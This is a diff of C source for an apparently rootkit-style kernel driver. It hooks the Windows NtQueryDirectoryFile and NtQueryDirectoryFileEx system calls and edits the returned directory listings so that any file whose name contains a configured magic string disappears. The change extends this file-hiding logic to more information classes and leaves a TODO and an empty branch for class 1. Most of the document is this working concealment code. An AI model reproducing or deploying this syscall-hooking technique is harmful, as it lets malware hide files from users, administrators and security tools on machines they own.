@@ -336,61 +336,64 @@ NTSTATUS DetourNtQueryDirectoryFile(
 	//
 	NTSTATUS OriginalStatus = OriginalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
 
-	// if the call succeeded and the requested class is 37, cast the buffer pointer and try to read it
-	if (NT_SUCCESS(OriginalStatus) && FileInformationClass == 37) {
-		PFILE_ID_BOTH_DIR_INFORMATION FileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
-		PFILE_ID_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
-		//kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileInformation struct, FileNameLength: %d, FileName char: %x\n", FileInformationPtr->FileNameLength, (FileInformationPtr->FileName)[0]);
+	if (NT_SUCCESS(OriginalStatus)) {
+		// if the requested class is one of [1, 2, 3, 12, 37, 38, 50, 60, 63] cast the buffer pointer to the appropriate structure pointer and read it
+		// TODO
+		if (FileInformationClass == 37) {
+			PFILE_ID_BOTH_DIR_INFORMATION FileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
+			PFILE_ID_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
+			//kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileInformation struct, FileNameLength: %d, FileName char: %x\n", FileInformationPtr->FileNameLength, (FileInformationPtr->FileName)[0]);
 
-		while (1) {
-			WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-			for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
-				FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
-			}
-			kprintf("[+] infinityhook: NtQueryDirectoryFile: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
-			if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
-				kprintf("[+] infinityhook: NtQueryDirectoryFile: SHOULD HIDE: %ws\n", FileNameBuffer);
+			while (1) {
+				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
+				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
+				}
+				kprintf("[+] infinityhook: NtQueryDirectoryFile: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
+				if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
+					kprintf("[+] infinityhook: NtQueryDirectoryFile: SHOULD HIDE: %ws\n", FileNameBuffer);
 
-				// Not the last one
-				if (FileInformationPtr->NextEntryOffset > 0) {
-					// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
+					// Not the last one
+					if (FileInformationPtr->NextEntryOffset > 0) {
+						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
 
-					// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
-					PFILE_ID_BOTH_DIR_INFORMATION TempFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
-					ULONG FileInformationBufferSizeToEnd = 0;
-					while (TempFileInformationPtr->NextEntryOffset != 0) {
-						FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
-						TempFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
+						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
+						PFILE_ID_BOTH_DIR_INFORMATION TempFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
+						ULONG FileInformationBufferSizeToEnd = 0;
+						while (TempFileInformationPtr->NextEntryOffset != 0) {
+							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
+							TempFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
+						}
+						// last record size (with filename)
+						FileInformationBufferSizeToEnd += sizeof(FILE_ID_BOTH_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?
+
+						// next structure address - start copying from there
+						PFILE_ID_BOTH_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
+
+						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);
+
+						continue; // handle the same structure address next (because it was moved)
 					}
-					// last record size (with filename)
-					FileInformationBufferSizeToEnd += sizeof(FILE_FULL_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?
 
-					// next structure address - start copying from there
-					PFILE_ID_BOTH_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
+					// Last one
+					else {
+						kprintf("[+] infinityhook: NtQueryDirectoryFile: SHOULD HIDE - LAST ONE\n");
 
-					memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);
+						// set previous NextEntryOffset to 0
+						PreviousFileInformationPtr->NextEntryOffset = 0;
 
-					continue; // handle the same structure address next (because it was moved)
+						// erease this FileInformation structure
+						memset(FileInformationPtr, 0, sizeof(FILE_FULL_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
+						break;
+					}
 				}
 
-				// Last one
+				if (FileInformationPtr->NextEntryOffset == 0) break;
 				else {
-					kprintf("[+] infinityhook: NtQueryDirectoryFile: SHOULD HIDE - LAST ONE\n");
-
-					// set previous NextEntryOffset to 0
-					PreviousFileInformationPtr->NextEntryOffset = 0;
-
-					// erease this FileInformation structure
-					memset(FileInformationPtr, 0, sizeof(FILE_FULL_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
-					break;
+					PreviousFileInformationPtr = FileInformationPtr;
+					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
+					FileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
 				}
-			}
-
-			if (FileInformationPtr->NextEntryOffset == 0) break;
-			else {
-				PreviousFileInformationPtr = FileInformationPtr;
-				// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
-				FileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
 			}
 		}
 	}
@@ -418,65 +421,70 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 	//
 	NTSTATUS OriginalStatus = OriginalNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
 
-	// if the call succeeded and the requested class is 2, cast the buffer pointer and try to read it
-	if (NT_SUCCESS(OriginalStatus) && FileInformationClass == 2) {
-		PFILE_FULL_DIR_INFORMATION FileInformationPtr = (PFILE_FULL_DIR_INFORMATION)FileInformation;
-		PFILE_FULL_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
-		//kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileInformation struct, FileNameLength: %d, FileName char: %x\n", FileInformationPtr->FileNameLength, (FileInformationPtr->FileName)[0]);
+	if (NT_SUCCESS(OriginalStatus)) {
+		// if the call succeeded and the requested class is one of [1, 2, 3, 12, 37, 38, 50, 60, 63], cast the buffer pointer to an appropriate structure and read it
+		if (FileInformationClass == 1) {
+			
+		}
+		else if (FileInformationClass == 2) {
+			PFILE_FULL_DIR_INFORMATION FileInformationPtr = (PFILE_FULL_DIR_INFORMATION)FileInformation;
+			PFILE_FULL_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
+			//kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileInformation struct, FileNameLength: %d, FileName char: %x\n", FileInformationPtr->FileNameLength, (FileInformationPtr->FileName)[0]);
 
-		while (1) {
-			WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-			for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
-				FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
-			}
-			kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
-			if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
-				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: SHOULD HIDE: %ws\n", FileNameBuffer);
-				// change its name to be xxx
-				/*for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
-					(FileInformationPtr->FileName)[i] = L'x';
-				}*/
+			while (1) {
+				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
+				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
+				}
+				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
+				if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
+					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: SHOULD HIDE: %ws\n", FileNameBuffer);
+					// change its name to be xxx
+					/*for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+						(FileInformationPtr->FileName)[i] = L'x';
+					}*/
 
-				// Not the last one
-				if (FileInformationPtr->NextEntryOffset > 0) {
-					// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
+					// Not the last one
+					if (FileInformationPtr->NextEntryOffset > 0) {
+						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
 					
-					// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
-					PFILE_FULL_DIR_INFORMATION TempFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
-					ULONG FileInformationBufferSizeToEnd = 0;
-					while (TempFileInformationPtr->NextEntryOffset != 0) {
-						FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
-						TempFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
+						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
+						PFILE_FULL_DIR_INFORMATION TempFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
+						ULONG FileInformationBufferSizeToEnd = 0;
+						while (TempFileInformationPtr->NextEntryOffset != 0) {
+							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
+							TempFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
+						}
+						// last record size (with filename)
+						FileInformationBufferSizeToEnd += sizeof(FILE_FULL_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?
+
+						// next structure address - start copying from there
+						PFILE_FULL_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
+
+						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);
+
+						continue; // handle the same structure address next (because it was moved)
 					}
-					// last record size (with filename)
-					FileInformationBufferSizeToEnd += sizeof(FILE_FULL_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?
 
-					// next structure address - start copying from there
-					PFILE_FULL_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
+					// Last one
+					else {
+						kprintf("[+] infinityhook: NtQueryDirectoryFileEx: SHOULD HIDE - LAST ONE\n");
 
-					memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);
+						// set previous NextEntryOffset to 0
+						PreviousFileInformationPtr->NextEntryOffset = 0;
 
-					continue; // handle the same structure address next (because it was moved)
+						// erease this FileInformation structure
+						memset(FileInformationPtr, 0, sizeof(FILE_FULL_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
+						break;
+					}
 				}
 
-				// Last one
+				if (FileInformationPtr->NextEntryOffset == 0) break;
 				else {
-					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: SHOULD HIDE - LAST ONE\n");
-
-					// set previous NextEntryOffset to 0
-					PreviousFileInformationPtr->NextEntryOffset = 0;
-
-					// erease this FileInformation structure
-					memset(FileInformationPtr, 0, sizeof(FILE_FULL_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
-					break;
+					PreviousFileInformationPtr = FileInformationPtr;
+					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
+					FileInformationPtr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
 				}
-			}
-
-			if (FileInformationPtr->NextEntryOffset == 0) break;
-			else {
-				PreviousFileInformationPtr = FileInformationPtr;
-				// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
-				FileInformationPtr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
 			}
 		}
 	}
